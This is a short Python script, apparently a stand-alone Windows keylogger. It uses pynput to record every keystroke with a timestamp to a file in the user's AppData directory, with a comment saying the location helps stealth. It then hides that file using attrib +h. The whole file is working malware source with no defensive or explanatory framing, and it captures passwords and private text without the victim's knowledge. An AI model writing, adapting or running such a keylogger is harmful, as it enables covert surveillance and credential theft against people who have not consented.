from pynput.keyboard import Listener
import os
import time
import getpass

os.system("Mode con: cols=100 lines=30")

logfile = f"C:\\Users\\{getpass.getuser()}\\AppData\\keylog.txt" # Log file path to user's AppData directory to avoid permission issues and improve stealth
if not os.path.exists(logfile):
    open(logfile, 'w').close()

def on_press(key):
    key_str = str(key).replace("'", "")
    if key_str == "Key.space":
        key_str = " "
    with open(logfile, 'a') as f:
        f.write(f"[{time.ctime()}] {key_str}\n")

def hideFile():
    os.system(f'attrib +h "{logfile}"')
hideFile()

with Listener(on_press=on_press) as listener:   
    listener.join()